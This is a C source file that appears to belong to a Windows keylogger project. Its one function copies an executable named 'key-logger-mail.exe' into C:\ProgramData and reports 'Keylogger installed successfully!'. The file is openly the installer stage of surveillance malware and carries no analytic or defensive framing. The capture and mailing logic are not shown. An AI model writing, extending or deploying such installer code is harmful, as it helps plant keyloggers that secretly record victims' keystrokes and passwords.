/******************************************************************************************************
 * HEADER FILE INCLUDES                                                                               *
 *****************************************************************************************************/

#include <stdio.h>
#include <inttypes.h>
#include <windows.h>

#include "key_logger_installer.h"

/******************************************************************************************************
 * LOCAL FUNCTIONS                                                                                    *
 *****************************************************************************************************/


/******************************************************************************************************
 * FUNCTION DEFINITIONS                                                                               *
 *****************************************************************************************************/

bool key_logger_installer_install(void)
{
	int32_t error_code = 0L;

	error_code = CopyFile("C:\\workdir\\Key-Logger\\key-logger-installer\\bin\\key-logger-mail.exe", "C:\\ProgramData\\key-logger-mail.exe", FALSE);
	if (0L == error_code)
	{
		(void)fprintf(stdout, "Failed! (%lu)\n", GetLastError());
		return false;
	}

	(void)fprintf(stdout, "Keylogger installed successfully!\n");
	return true;
}
